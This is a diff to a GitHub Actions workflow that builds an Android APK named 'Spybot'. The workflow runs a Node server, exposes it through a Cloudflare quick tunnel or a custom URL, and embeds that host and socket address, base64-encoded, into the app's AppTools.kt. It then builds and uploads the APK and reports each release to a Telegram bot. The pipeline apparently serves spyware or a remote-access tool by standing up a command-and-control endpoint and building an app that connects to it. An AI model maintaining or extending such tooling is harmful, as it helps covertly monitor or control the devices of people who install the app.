@@ -8,14 +8,22 @@ on:
         required: true
         default: "30"
         type: choice
-        options: ["5", "10", "15", "30", "60"]
+        options:
+          - "5"
+          - "10"
+          - "15"
+          - "30"
+          - "60"
 
       build_type:
         description: "APK build type"
         required: true
         default: "release"
         type: choice
-        options: ["debug", "release", "both"]
+        options:
+          - "debug"
+          - "release"
+          - "both"
 
       custom_base_url:
         description: "Custom URL (http://example.com or https://example.com). Leave empty to use Cloudflare."
@@ -47,82 +55,141 @@ jobs:
       # ----------------------------------------------------
       # CHECKOUT
       # ----------------------------------------------------
-      - uses: actions/checkout@v4
+      - name: Checkout repository
+        uses: actions/checkout@v4
 
       # ----------------------------------------------------
       # DETECT VERSION
       # ----------------------------------------------------
       - name: Detect app version
         id: version
+        shell: bash
         run: |
           FILE=$(find ./app -name "build.gradle*" | head -n 1)
-          VERSION=$(grep "versionName" "$FILE" | head -1 | sed 's/.*versionName[ =]*"\{0,1\}//' | sed 's/".*//')
-          echo "version_name=$VERSION" >> $GITHUB_OUTPUT
+
+          if [ -z "$FILE" ]; then
+            echo "Gradle file not found"
+            exit 1
+          fi
+
+          VERSION=$(grep -oP 'versionName\s*=?\s*"\K[^"]+' "$FILE" | head -1)
+
+          if [ -z "$VERSION" ]; then
+            VERSION="unknown"
+          fi
+
+          echo "version_name=${VERSION}" >> "$GITHUB_OUTPUT"
 
       # ----------------------------------------------------
-      # START SERVER
+      # SETUP NODE
       # ----------------------------------------------------
       - name: Setup Node
         uses: actions/setup-node@v4
         with:
           node-version: 20
 
+      # ----------------------------------------------------
+      # INSTALL SERVER DEPENDENCIES
+      # ----------------------------------------------------
       - name: Install server dependencies
         working-directory: ./server
         run: npm install
 
+      # ----------------------------------------------------
+      # CREATE SERVER ENV
+      # ----------------------------------------------------
       - name: Create .env
         working-directory: ./server
+        shell: bash
         run: |
-          echo "TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}" > .env
-          echo "TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}" >> .env
-          echo "PORT=8999" >> .env
+          cat > .env <<EOF
+          TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
+          TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
+          PORT=8999
+          EOF
 
+      # ----------------------------------------------------
+      # START SERVER
+      # ----------------------------------------------------
       - name: Start server
         working-directory: ./server
+        shell: bash
         run: |
           nohup npm start > /tmp/server.log 2>&1 &
+
+          echo "Waiting for server..."
+
           for i in {1..20}; do
-            curl -s http://localhost:8999/ && break
+            if curl -s http://localhost:8999/ > /dev/null; then
+              echo "Server started successfully"
+              exit 0
+            fi
+
             sleep 2
           done
 
+          echo "Server failed to start"
+          cat /tmp/server.log || true
+          exit 1
+
       # ----------------------------------------------------
-      # CLOUDFLARE TUNNEL (SKIPPED IF CUSTOM URL PROVIDED)
+      # CREATE CLOUDFLARE TUNNEL
       # ----------------------------------------------------
       - name: Create tunnel
         id: tunnel
         if: ${{ github.event.inputs.custom_base_url == '' }}
+        shell: bash
         run: |
-          curl -L -o cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+          curl -L \
+            -o cloudflared.deb \
+            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+
           sudo dpkg -i cloudflared.deb
-          nohup cloudflared tunnel --url http://localhost:8999 > /tmp/tunnel.log 2>&1 &
+
+          nohup cloudflared tunnel \
+            --url http://localhost:8999 \
+            > /tmp/tunnel.log 2>&1 &
+
+          echo "Waiting for Cloudflare tunnel..."
+
           for i in {1..40}; do
             sleep 2
+
             URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)
+
             if [ -n "$URL" ]; then
-              echo "tunnel_url=$URL" >> $GITHUB_OUTPUT
-              break
+              echo "Tunnel URL: $URL"
+              echo "tunnel_url=${URL}" >> "$GITHUB_OUTPUT"
+              exit 0
             fi
           done
+
+          echo "Failed to create Cloudflare tunnel"
+          cat /tmp/tunnel.log || true
+          exit 1
 
       # ----------------------------------------------------
       # VALIDATE CUSTOM URL
       # ----------------------------------------------------
       - name: Validate custom URL
         if: ${{ github.event.inputs.custom_base_url != '' }}
+        shell: bash
         run: |
           URL="${{ github.event.inputs.custom_base_url }}"
+
           if [[ ! "$URL" =~ ^https?:// ]]; then
             echo "Custom URL must start with http:// or https://"
             exit 1
           fi
-          STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
+
+          STATUS=$(curl -L -s -o /dev/null -w "%{http_code}" "$URL")
+
           if [[ "$STATUS" -lt 200 || "$STATUS" -ge 400 ]]; then
-            echo "Custom URL $URL is not reachable. HTTP status: $STATUS"
+            echo "Custom URL is unreachable. HTTP status: $STATUS"
             exit 1
           fi
-          echo "Custom URL $URL is valid and reachable."
+
+          echo "Custom URL is valid."
 
       # ----------------------------------------------------
       # CONFIGURE APPTOOLS
@@ -130,17 +197,20 @@ jobs:
       - name: Configure AppTools.kt
         env:
           CUSTOM: ${{ github.event.inputs.custom_base_url }}
-          TUNNEL: ${{ steps.tunnel.outputs.tunnel_url || '' }}
+          TUNNEL: ${{ steps.tunnel.outputs.tunnel_url }}
+        shell: bash
         run: |
           if [ -n "$CUSTOM" ]; then
             BASE="${CUSTOM%/}"
           else
-            if [ -z "$TUNNEL" ]; then
-              echo "Tunnel URL not available!"
-              exit 1
-            fi
             BASE="${TUNNEL%/}"
           fi
+
+          if [ -z "$BASE" ]; then
+            echo "Base URL is empty"
+            exit 1
+          fi
+
           if [[ "$BASE" =~ ^https:// ]]; then
             HOST="${BASE}/"
             SOCKET="${BASE/https:/wss:}/"
@@ -148,17 +218,30 @@ jobs:
             HOST="${BASE}/"
             SOCKET="${BASE/http:/ws:}/"
           else
-            echo "Invalid domain format: $BASE"
+            echo "Invalid BASE URL: $BASE"
             exit 1
           fi
+
           JSON="{\"host\":\"$HOST\",\"socket\":\"$SOCKET\"}"
-          DATA=$(echo -n "$JSON" | base64 -w0)
-          FILE="./app/app/src/main/java/com/spybot/app/Utils/AppTools.kt"
-          sed -i "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" "$FILE"
-          echo "Configured AppTools.kt with BASE=$BASE"
+
+          DATA=$(echo -n "$JSON" | base64 -w 0)
+
+          FILE=$(find ./app -name "AppTools.kt" | head -n 1)
+
+          if [ -z "$FILE" ]; then
+            echo "AppTools.kt not found"
+            exit 1
+          fi
+
+          sed -i \
+            "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" \
+            "$FILE"
+
+          echo "Configured AppTools.kt"
+          echo "BASE=$BASE"
 
       # ----------------------------------------------------
-      # BUILD APK
+      # SETUP JAVA
       # ----------------------------------------------------
       - name: Setup Java
         uses: actions/setup-java@v4
@@ -166,24 +249,58 @@ jobs:
           distribution: temurin
           java-version: 17
 
+      # ----------------------------------------------------
+      # BUILD APK
+      # ----------------------------------------------------
       - name: Build APK
         working-directory: ./app
+        shell: bash
         run: |
           chmod +x gradlew
-          case "${{ github.event.inputs.build_type }}" in
-            debug) ./gradlew assembleDebug --no-daemon ;;
-            release) ./gradlew assembleRelease --no-daemon ;;
-            both) ./gradlew assembleDebug assembleRelease --no-daemon ;;
+
+          BUILD_TYPE="${{ github.event.inputs.build_type }}"
+
+          case "$BUILD_TYPE" in
+            debug)
+              ./gradlew assembleDebug --no-daemon
+              ;;
+            release)
+              ./gradlew assembleRelease --no-daemon
+              ;;
+            both)
+              ./gradlew assembleDebug assembleRelease --no-daemon
+              ;;
+            *)
+              echo "Invalid build type"
+              exit 1
+              ;;
           esac
 
       # ----------------------------------------------------
-      # COLLECT APK
+      # COLLECT APK FILES
       # ----------------------------------------------------
       - name: Collect APK
+        shell: bash
         run: |
           mkdir -p output
-          find ./app -name "*.apk" -type f -exec cp {} output/ \;
 
+          find ./app \
+            -type f \
+            -name "*.apk" \
+            -exec cp {} output/ \;
+
+          COUNT=$(find output -name "*.apk" | wc -l)
+
+          if [ "$COUNT" -eq 0 ]; then
+            echo "No APK files found"
+            exit 1
+          fi
+
+          echo "Collected $COUNT APK file(s)"
+
+      # ----------------------------------------------------
+      # UPLOAD APK
+      # ----------------------------------------------------
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
@@ -195,23 +312,38 @@ jobs:
       # TELEGRAM NOTIFICATION
       # ----------------------------------------------------
       - name: Notify Telegram
+        shell: bash
         run: |
-          MSG="Spybot v${{ steps.version.outputs.version_name }} is live."
-          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
-            -d chat_id=${TELEGRAM_CHAT_ID} \
+          MSG="Spybot v${{ steps.version.outputs.version_name }} build completed successfully."
+
+          curl -s \
+            -X POST \
+            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
+            -d chat_id="${TELEGRAM_CHAT_ID}" \
             -d text="$MSG"
 
       # ----------------------------------------------------
       # KEEP SERVER RUNNING
       # ----------------------------------------------------
       - name: Keep alive
-        run: sleep $(( ${{ github.event.inputs.duration }} * 60 ))
+        shell: bash
+        run: |
+          DURATION="${{ github.event.inputs.duration }}"
+
+          echo "Keeping server alive for ${DURATION} minute(s)..."
+
+          sleep $((DURATION * 60))
 
       # ----------------------------------------------------
       # CLEANUP
       # ----------------------------------------------------
       - name: Cleanup
         if: always()
+        shell: bash
         run: |
+          echo "Cleaning up processes..."
+
           pkill -f cloudflared || true
           pkill -f node || true
+
+          echo "Cleanup completed"
